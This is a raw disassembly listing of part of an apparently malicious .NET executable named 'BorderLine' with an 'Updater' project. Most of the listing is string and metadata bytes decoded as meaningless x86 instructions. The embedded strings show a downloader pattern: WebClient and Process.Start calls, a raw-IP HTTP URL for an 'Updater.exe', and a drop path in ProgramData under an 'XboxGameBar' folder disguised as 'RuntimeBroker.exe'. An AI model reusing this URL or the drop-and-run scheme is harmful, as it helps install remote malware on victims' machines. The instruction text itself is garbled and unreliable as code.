  4025e2:	65 6d                	gs insl (%dx),%es:(%edi)
  4025e4:	2e 52                	cs push %edx
  4025e6:	75 6e                	jne    0x402656
  4025e8:	74 69                	je     0x402653
  4025ea:	6d                   	insl   (%dx),%es:(%edi)
  4025eb:	65 2e 56             	gs cs push %esi
  4025ee:	65 72 73             	gs jb  0x402664
  4025f1:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4025f8:	53                   	push   %ebx
  4025f9:	74 72                	je     0x40266d
  4025fb:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  402602:	46                   	inc    %esi
  402603:	6f                   	outsl  %ds:(%esi),(%dx)
  402604:	6c                   	insb   (%dx),%es:(%edi)
  402605:	64 65 72 50          	fs gs jb 0x402659
  402609:	61                   	popa
  40260a:	74 68                	je     0x402674
  40260c:	00 50 72             	add    %dl,0x72(%eax)
  40260f:	6f                   	outsl  %ds:(%esi),(%dx)
  402610:	67 72 61             	addr16 jb 0x402674
  402613:	6d                   	insl   (%dx),%es:(%edi)
  402614:	00 53 79             	add    %dl,0x79(%ebx)
  402617:	73 74                	jae    0x40268d
  402619:	65 6d                	gs insl (%dx),%es:(%edi)
  40261b:	00 4d 61             	add    %cl,0x61(%ebp)
  40261e:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  402625:	65 6d                	gs insl (%dx),%es:(%edi)
  402627:	2e 52                	cs push %edx
  402629:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40262c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402631:	6e                   	outsb  %ds:(%esi),(%dx)
  402632:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  402636:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40263b:	79 49                	jns    0x402686
  40263d:	6e                   	outsb  %ds:(%esi),(%dx)
  40263e:	66 6f                	outsw  %ds:(%esi),(%dx)
  402640:	00 53 70             	add    %dl,0x70(%ebx)
  402643:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  402647:	6c                   	insb   (%dx),%es:(%edi)
  402648:	46                   	inc    %esi
  402649:	6f                   	outsl  %ds:(%esi),(%dx)
  40264a:	6c                   	insb   (%dx),%es:(%edi)
  40264b:	64 65 72 00          	fs gs jb 0x40264f
  40264f:	55                   	push   %ebp
  402650:	70 64                	jo     0x4026b6
  402652:	61                   	popa
  402653:	74 65                	je     0x4026ba
  402655:	72 00                	jb     0x402657
  402657:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40265c:	00 2e                	add    %ch,(%esi)
  40265e:	63 63 74             	arpl   %esp,0x74(%ebx)
  402661:	6f                   	outsl  %ds:(%esi),(%dx)
  402662:	72 00                	jb     0x402664
  402664:	53                   	push   %ebx
  402665:	79 73                	jns    0x4026da
  402667:	74 65                	je     0x4026ce
  402669:	6d                   	insl   (%dx),%es:(%edi)
  40266a:	2e 44                	cs inc %esp
  40266c:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  402673:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  40267a:	74 65                	je     0x4026e1
  40267c:	6d                   	insl   (%dx),%es:(%edi)
  40267d:	2e 52                	cs push %edx
  40267f:	75 6e                	jne    0x4026ef
  402681:	74 69                	je     0x4026ec
  402683:	6d                   	insl   (%dx),%es:(%edi)
  402684:	65 2e 49             	gs cs dec %ecx
  402687:	6e                   	outsb  %ds:(%esi),(%dx)
  402688:	74 65                	je     0x4026ef
  40268a:	72 6f                	jb     0x4026fb
  40268c:	70 53                	jo     0x4026e1
  40268e:	65 72 76             	gs jb  0x402707
  402691:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  402698:	73 74                	jae    0x40270e
  40269a:	65 6d                	gs insl (%dx),%es:(%edi)
  40269c:	2e 52                	cs push %edx
  40269e:	75 6e                	jne    0x40270e
  4026a0:	74 69                	je     0x40270b
  4026a2:	6d                   	insl   (%dx),%es:(%edi)
  4026a3:	65 2e 43             	gs cs inc %ebx
  4026a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a7:	6d                   	insl   (%dx),%es:(%edi)
  4026a8:	70 69                	jo     0x402713
  4026aa:	6c                   	insb   (%dx),%es:(%edi)
  4026ab:	65 72 53             	gs jb  0x402701
  4026ae:	65 72 76             	gs jb  0x402727
  4026b1:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4026b8:	62 75 67             	bound  %esi,0x67(%ebp)
  4026bb:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4026c2:	65 
  4026c3:	73 00                	jae    0x4026c5
  4026c5:	45                   	inc    %ebp
  4026c6:	78 70                	js     0x402738
  4026c8:	61                   	popa
  4026c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4026ca:	64 45                	fs inc %ebp
  4026cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4026cd:	76 69                	jbe    0x402738
  4026cf:	72 6f                	jb     0x402740
  4026d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4026d2:	6d                   	insl   (%dx),%es:(%edi)
  4026d3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4026d5:	74 56                	je     0x40272d
  4026d7:	61                   	popa
  4026d8:	72 69                	jb     0x402743
  4026da:	61                   	popa
  4026db:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  4026df:	00 57 72             	add    %dl,0x72(%edi)
  4026e2:	69 74 65 41 6c 6c 42 	imul   $0x79426c6c,0x41(%ebp,%eiz,2),%esi
  4026e9:	79 
  4026ea:	74 65                	je     0x402751
  4026ec:	73 00                	jae    0x4026ee
  4026ee:	50                   	push   %eax
  4026ef:	61                   	popa
  4026f0:	74 68                	je     0x40275a
  4026f2:	73 00                	jae    0x4026f4
  4026f4:	50                   	push   %eax
  4026f5:	72 6f                	jb     0x402766
  4026f7:	63 65 73             	arpl   %esp,0x73(%ebp)
  4026fa:	73 00                	jae    0x4026fc
  4026fc:	45                   	inc    %ebp
  4026fd:	78 69                	js     0x402768
  4026ff:	73 74                	jae    0x402775
  402701:	73 00                	jae    0x402703
  402703:	43                   	inc    %ebx
  402704:	6f                   	outsl  %ds:(%esi),(%dx)
  402705:	6e                   	outsb  %ds:(%esi),(%dx)
  402706:	63 61 74             	arpl   %esp,0x74(%ecx)
  402709:	00 4f 62             	add    %cl,0x62(%edi)
  40270c:	6a 65                	push   $0x65
  40270e:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  402712:	79 73                	jns    0x402787
  402714:	74 65                	je     0x40277b
  402716:	6d                   	insl   (%dx),%es:(%edi)
  402717:	2e 4e                	cs dec %esi
  402719:	65 74 00             	gs je  0x40271c
  40271c:	45                   	inc    %ebp
  40271d:	78 69                	js     0x402788
  40271f:	74 00                	je     0x402721
  402721:	57                   	push   %edi
  402722:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  402726:	69 65 6e 74 00 45 6e 	imul   $0x6e450074,0x6e(%ebp),%esp
  40272d:	76 69                	jbe    0x402798
  40272f:	72 6f                	jb     0x4027a0
  402731:	6e                   	outsb  %ds:(%esi),(%dx)
  402732:	6d                   	insl   (%dx),%es:(%edi)
  402733:	65 6e                	outsb  %gs:(%esi),(%dx)
  402735:	74 00                	je     0x402737
  402737:	53                   	push   %ebx
  402738:	74 61                	je     0x40279b
  40273a:	72 74                	jb     0x4027b0
  40273c:	00 43 72             	add    %al,0x72(%ebx)
  40273f:	65 61                	gs popa
  402741:	74 65                	je     0x4027a8
  402743:	44                   	inc    %esp
  402744:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40274b:	79 00                	jns    0x40274d
  40274d:	00 00                	add    %al,(%eax)
  40274f:	00 00                	add    %al,(%eax)
  402751:	11 5c 00 44          	adc    %ebx,0x44(%eax,%eax,1)
  402755:	00 69 00             	add    %ch,0x0(%ecx)
  402758:	73 00                	jae    0x40275a
  40275a:	63 00                	arpl   %eax,(%eax)
  40275c:	6f                   	outsl  %ds:(%esi),(%dx)
  40275d:	00 72 00             	add    %dh,0x0(%edx)
  402760:	64 00 00             	add    %al,%fs:(%eax)
  402763:	1b 25 00 50 00 72    	sbb    0x72005000,%esp
  402769:	00 6f 00             	add    %ch,0x0(%edi)
  40276c:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  402770:	61                   	popa
  402771:	00 6d 00             	add    %ch,0x0(%ebp)
  402774:	44                   	inc    %esp
  402775:	00 61 00             	add    %ah,0x0(%ecx)
  402778:	74 00                	je     0x40277a
  40277a:	61                   	popa
  40277b:	00 25 00 00 1b 5c    	add    %ah,0x5c1b0000
  402781:	00 58 00             	add    %bl,0x0(%eax)
  402784:	62 00                	bound  %eax,(%eax)
  402786:	6f                   	outsl  %ds:(%esi),(%dx)
  402787:	00 78 00             	add    %bh,0x0(%eax)
  40278a:	47                   	inc    %edi
  40278b:	00 61 00             	add    %ah,0x0(%ecx)
  40278e:	6d                   	insl   (%dx),%es:(%edi)
  40278f:	00 65 00             	add    %ah,0x0(%ebp)
  402792:	42                   	inc    %edx
  402793:	00 61 00             	add    %ah,0x0(%ecx)
  402796:	72 00                	jb     0x402798
  402798:	5c                   	pop    %esp
  402799:	00 00                	add    %al,(%eax)
  40279b:	23 52 00             	and    0x0(%edx),%edx
  40279e:	75 00                	jne    0x4027a0
  4027a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4027a1:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4027a5:	00 6d 00             	add    %ch,0x0(%ebp)
  4027a8:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  4027ac:	72 00                	jb     0x4027ae
  4027ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4027af:	00 6b 00             	add    %ch,0x0(%ebx)
  4027b2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4027b6:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4027ba:	78 00                	js     0x4027bc
  4027bc:	65 00 00             	add    %al,%gs:(%eax)
  4027bf:	0f 5c 00             	subps  (%eax),%xmm0
  4027c2:	2e 00 6e 00          	add    %ch,%cs:0x0(%esi)
  4027c6:	75 00                	jne    0x4027c8
  4027c8:	67 00 65 00          	add    %ah,0x0(%di)
  4027cc:	74 00                	je     0x4027ce
  4027ce:	00 4f 68             	add    %cl,0x68(%edi)
  4027d1:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4027d5:	00 70 00             	add    %dh,0x0(%eax)
  4027d8:	3a 00                	cmp    (%eax),%al
  4027da:	2f                   	das
  4027db:	00 2f                	add    %ch,(%edi)
  4027dd:	00 36                	add    %dh,(%esi)
  4027df:	00 32                	add    %dh,(%edx)
  4027e1:	00 2e                	add    %ch,(%esi)
  4027e3:	00 31                	add    %dh,(%ecx)
  4027e5:	00 38                	add    %bh,(%eax)
  4027e7:	00 32                	add    %dh,(%edx)
  4027e9:	00 2e                	add    %ch,(%esi)
  4027eb:	00 38                	add    %bh,(%eax)
  4027ed:	00 34 00             	add    %dh,(%eax,%eax,1)
  4027f0:	2e 00 36             	add    %dh,%cs:(%esi)
  4027f3:	00 31                	add    %dh,(%ecx)
  4027f5:	00 2f                	add    %ch,(%edi)
  4027f7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4027fa:	35 00 36 00 33       	xor    $0x33003600,%eax
  4027ff:	00 36                	add    %dh,(%esi)
  402801:	00 33                	add    %dh,(%ebx)
  402803:	00 36                	add    %dh,(%esi)
  402805:	00 2f                	add    %ch,(%edi)
  402807:	00 55 00             	add    %dl,0x0(%ebp)
  40280a:	70 00                	jo     0x40280c
  40280c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  402810:	74 00                	je     0x402812
  402812:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  402816:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40281a:	78 00                	js     0x40281c
  40281c:	65 00 00             	add    %al,%gs:(%eax)
  40281f:	00 69 d4             	add    %ch,-0x2c(%ecx)
  402822:	20 a1 3a 2a b7 48    	and    %ah,0x48b72a3a(%ecx)
  402828:	82 92 01 01 ac e6 8b 	adcb   $0x8b,-0x1953feff(%edx)
  40282f:	52                   	push   %edx
  402830:	00 04 20             	add    %al,(%eax,%eiz,1)
  402833:	01 01                	add    %eax,(%ecx)
  402835:	08 03                	or     %al,(%ebx)
  402837:	20 00                	and    %al,(%eax)
  402839:	01 05 20 01 01 11    	add    %eax,0x11010120
  40283f:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  402842:	01 01                	add    %eax,(%ecx)
  402844:	0e                   	push   %cs
  402845:	04 20                	add    $0x20,%al
  402847:	01 01                	add    %eax,(%ecx)
  402849:	02 05 00 01 0e 11    	add    0x110e0100,%al
  40284f:	51                   	push   %ecx
  402850:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  402855:	0e                   	push   %cs
  402856:	04 00                	add    $0x0,%al
  402858:	01 0e                	add    %ecx,(%esi)
  40285a:	0e                   	push   %cs
  40285b:	06                   	push   %es
  40285c:	07                   	pop    %es
  40285d:	03 12                	add    (%edx),%edx
  40285f:	49                   	dec    %ecx
  402860:	02 02                	add    (%edx),%al
  402862:	04 00                	add    $0x0,%al
  402864:	01 02                	add    %eax,(%edx)
  402866:	0e                   	push   %cs
  402867:	04 00                	add    $0x0,%al
  402869:	01 01                	add    %eax,(%ecx)
  40286b:	08 05 00 01 12 5d    	or     %al,0x5d120100
  402871:	0e                   	push   %cs
  402872:	05 20 01 1d 05       	add    $0x51d0120,%eax
  402877:	0e                   	push   %cs
  402878:	06                   	push   %es
  402879:	00 02                	add    %al,(%edx)
  40287b:	01 0e                	add    %ecx,(%esi)
  40287d:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  402882:	12 65 0e             	adc    0xe(%ebp),%ah
  402885:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  40288b:	34 e0                	xor    $0xe0,%al
  40288d:	89 02                	mov    %eax,(%edx)
  40288f:	06                   	push   %es
  402890:	0e                   	push   %cs
  402891:	03 00                	add    (%eax),%eax
  402893:	00 01                	add    %al,(%ecx)
  402895:	08 01                	or     %al,(%ecx)
  402897:	00 08                	add    %cl,(%eax)
  402899:	00 00                	add    %al,(%eax)
  40289b:	00 00                	add    %al,(%eax)
  40289d:	00 1e                	add    %bl,(%esi)
  40289f:	01 00                	add    %eax,(%eax)
  4028a1:	01 00                	add    %eax,(%eax)
  4028a3:	54                   	push   %esp
  4028a4:	02 16                	add    (%esi),%dl
  4028a6:	57                   	push   %edi
  4028a7:	72 61                	jb     0x40290a
  4028a9:	70 4e                	jo     0x4028f9
  4028ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4028ad:	45                   	inc    %ebp
  4028ae:	78 63                	js     0x402913
  4028b0:	65 70 74             	gs jo  0x402927
  4028b3:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4028ba:	77 73                	ja     0x40292f
  4028bc:	01 08                	add    %ecx,(%eax)
  4028be:	01 00                	add    %eax,(%eax)
  4028c0:	07                   	pop    %es
  4028c1:	01 00                	add    %eax,(%eax)
  4028c3:	00 00                	add    %al,(%eax)
  4028c5:	00 0f                	add    %cl,(%edi)
  4028c7:	01 00                	add    %eax,(%eax)
  4028c9:	0a 42 6f             	or     0x6f(%edx),%al
  4028cc:	72 64                	jb     0x402932
  4028ce:	65 72 4c             	gs jb  0x40291d
  4028d1:	69 6e 65 00 00 05 01 	imul   $0x1050000,0x65(%esi),%ebp
  4028d8:	00 00                	add    %al,(%eax)
  4028da:	00 00                	add    %al,(%eax)
  4028dc:	0f 01 00             	sgdtl  (%eax)
  4028df:	0a 37                	or     (%edi),%dh
  4028e1:	33 33                	xor    (%ebx),%esi
  4028e3:	37                   	aaa
  4028e4:	2d 31 37 33 35       	sub    $0x35333731,%eax
  4028e9:	32 00                	xor    (%eax),%al
  4028eb:	00 21                	add    %ah,(%ecx)
  4028ed:	01 00                	add    %eax,(%eax)
  4028ef:	1c 43                	sbb    $0x43,%al
  4028f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4028f2:	70 79                	jo     0x40296d
  4028f4:	72 69                	jb     0x40295f
  4028f6:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  4028fc:	20 37                	and    %dh,(%edi)
  4028fe:	33 33                	xor    (%ebx),%esi
  402900:	37                   	aaa
  402901:	2d 31 37 33 35       	sub    $0x35333731,%eax
  402906:	32 20                	xor    (%eax),%ah
  402908:	32 30                	xor    (%eax),%dh
  40290a:	32 33                	xor    (%ebx),%dh
  40290c:	00 00                	add    %al,(%eax)
  40290e:	29 01                	sub    %eax,(%ecx)
  402910:	00 24 65 38 38 34 32 	add    %ah,0x32343838(,%eiz,2)
  402917:	35 62 35 2d 61       	xor    $0x612d3562,%eax
  40291c:	65 37                	gs aaa
  40291e:	64 2d 34 35 62 39    	fs sub $0x39623534,%eax
  402924:	2d 39 33 62 35       	sub    $0x35623339,%eax
  402929:	2d 66 30 61 36       	sub    $0x36613066,%eax
  40292e:	65 33 65 36          	xor    %gs:0x36(%ebp),%esp
  402932:	62 34 37             	bound  %esi,(%edi,%esi,1)
  402935:	33 00                	xor    (%eax),%eax
  402937:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40293a:	00 07                	add    %al,(%edi)
  40293c:	31 2e                	xor    %ebp,(%esi)
  40293e:	30 2e                	xor    %ch,(%esi)
  402940:	30 2e                	xor    %ch,(%esi)
  402942:	30 00                	xor    %al,(%eax)
  402944:	00 49 01             	add    %cl,0x1(%ecx)
  402947:	00 1a                	add    %bl,(%edx)
  402949:	2e 4e                	cs dec %esi
  40294b:	45                   	inc    %ebp
  40294c:	54                   	push   %esp
  40294d:	46                   	inc    %esi
  40294e:	72 61                	jb     0x4029b1
  402950:	6d                   	insl   (%dx),%es:(%edi)
  402951:	65 77 6f             	gs ja  0x4029c3
  402954:	72 6b                	jb     0x4029c1
  402956:	2c 56                	sub    $0x56,%al
  402958:	65 72 73             	gs jb  0x4029ce
  40295b:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  402962:	38 01                	cmp    %al,(%ecx)
  402964:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  402968:	46                   	inc    %esi
  402969:	72 61                	jb     0x4029cc
  40296b:	6d                   	insl   (%dx),%es:(%edi)
  40296c:	65 77 6f             	gs ja  0x4029de
  40296f:	72 6b                	jb     0x4029dc
  402971:	44                   	inc    %esp
  402972:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  402979:	61                   	popa
  40297a:	6d                   	insl   (%dx),%es:(%edi)
  40297b:	65 12 2e             	adc    %gs:(%esi),%ch
  40297e:	4e                   	dec    %esi
  40297f:	45                   	inc    %ebp
  402980:	54                   	push   %esp
  402981:	20 46 72             	and    %al,0x72(%esi)
  402984:	61                   	popa
  402985:	6d                   	insl   (%dx),%es:(%edi)
  402986:	65 77 6f             	gs ja  0x4029f8
  402989:	72 6b                	jb     0x4029f6
  40298b:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40298e:	38 00                	cmp    %al,(%eax)
  402990:	00 00                	add    %al,(%eax)
  402992:	00 00                	add    %al,(%eax)
  402994:	4d                   	dec    %ebp
  402995:	a2 71 c2 00 00       	mov    %al,0xc271
  40299a:	00 00                	add    %al,(%eax)
  40299c:	02 00                	add    (%eax),%al
  40299e:	00 00                	add    %al,(%eax)
  4029a0:	60                   	pusha
  4029a1:	00 00                	add    %al,(%eax)
  4029a3:	00 c8                	add    %cl,%al
  4029a5:	29 00                	sub    %eax,(%eax)
  4029a7:	00 c8                	add    %cl,%al
  4029a9:	0b 00                	or     (%eax),%eax
	...
  4029b7:	00 10                	add    %dl,(%eax)
	...
  4029c5:	00 00                	add    %al,(%eax)
  4029c7:	00 52 53             	add    %dl,0x53(%edx)
  4029ca:	44                   	inc    %esp
  4029cb:	53                   	push   %ebx
  4029cc:	af                   	scas   %es:(%edi),%eax
  4029cd:	2f                   	das
  4029ce:	eb d8                	jmp    0x4029a8
  4029d0:	30 81 87 46 ae 1d    	xor    %al,0x1dae4687(%ecx)
  4029d6:	3b d6                	cmp    %esi,%edx
  4029d8:	53                   	push   %ebx
  4029d9:	ca fe a0             	lret   $0xa0fe
  4029dc:	01 00                	add    %eax,(%eax)
  4029de:	00 00                	add    %al,(%eax)
  4029e0:	43                   	inc    %ebx
  4029e1:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  4029e5:	65 72 73             	gs jb  0x402a5b
  4029e8:	5c                   	pop    %esp
  4029e9:	55                   	push   %ebp
  4029ea:	73 65                	jae    0x402a51
  4029ec:	72 27                	jb     0x402a15
  4029ee:	5c                   	pop    %esp
  4029ef:	73 6f                	jae    0x402a60
  4029f1:	75 72                	jne    0x402a65
  4029f3:	63 65 5c             	arpl   %esp,0x5c(%ebp)
  4029f6:	72 65                	jb     0x402a5d
  4029f8:	70 6f                	jo     0x402a69
  4029fa:	73 5c                	jae    0x402a58
  4029fc:	42                   	inc    %edx
  4029fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4029fe:	72 64                	jb     0x402a64
  402a00:	65 72 4c             	gs jb  0x402a4f
  402a03:	69 6e 65 5c 42 6f 72 	imul   $0x726f425c,0x65(%esi),%ebp
  402a0a:	64 65 72 4c          	fs gs jb 0x402a5a
  402a0e:	69 6e 65 5c 6f 62 6a 	imul   $0x6a626f5c,0x65(%esi),%ebp
  402a15:	5c                   	pop    %esp
  402a16:	44                   	inc    %esp
  402a17:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  402a1b:	5c                   	pop    %esp
  402a1c:	55                   	push   %ebp
  402a1d:	70 64                	jo     0x402a83
  402a1f:	61                   	popa
  402a20:	74 65                	je     0x402a87
  402a22:	72 2e                	jb     0x402a52
  402a24:	70 64                	jo     0x402a8a
  402a26:	62 00                	bound  %eax,(%eax)
  402a28:	50                   	push   %eax
  402a29:	2a 00                	sub    (%eax),%al
	...
  402a33:	00 6a 2a             	add    %ch,0x2a(%edx)
  402a36:	00 00                	add    %al,(%eax)
  402a38:	00 20                	add    %ah,(%eax)
	...
  402a4e:	00 00                	add    %al,(%eax)
  402a50:	5c                   	pop    %esp
  402a51:	2a 00                	sub    (%eax),%al
	...
  402a5b:	00 00                	add    %al,(%eax)
  402a5d:	00 5f 43             	add    %bl,0x43(%edi)
  402a60:	6f                   	outsl  %ds:(%esi),(%dx)
  402a61:	72 45                	jb     0x402aa8
  402a63:	78 65                	js     0x402aca
  402a65:	4d                   	dec    %ebp
  402a66:	61                   	popa
  402a67:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  402a6e:	72 65                	jb     0x402ad5
  402a70:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  402a74:	6c                   	insb   (%dx),%es:(%edi)
  402a75:	00 00                	add    %al,(%eax)
  402a77:	00 00                	add    %al,(%eax)
  402a79:	00 ff                	add    %bh,%bh
  402a7b:	25 00 20 40 00       	and    $0x402000,%eax
